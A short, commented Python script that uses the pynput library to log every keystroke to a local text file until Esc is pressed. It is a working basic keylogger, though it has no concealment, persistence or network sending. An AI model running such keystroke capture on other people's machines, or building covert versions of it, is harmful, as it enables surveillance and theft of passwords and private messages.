from pynput.keyboard import Key, Listener

# File to store the keystrokes
log_file = "key_log.txt"

# Function that gets called when a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f'{key.char}')  # Writes the character to the log file
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:  # Special case for spacebar
                f.write(' ')
            elif key == Key.enter:  # Special case for Enter key
                f.write('\n')
            else:
                f.write(f'[{key}]')  # For special keys, write them in brackets

# Function to stop the listener, e.g., when the Esc key is pressed
def on_release(key):
    if key == Key.esc:
        return False  # Stops the listener

# Setting up the listener for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
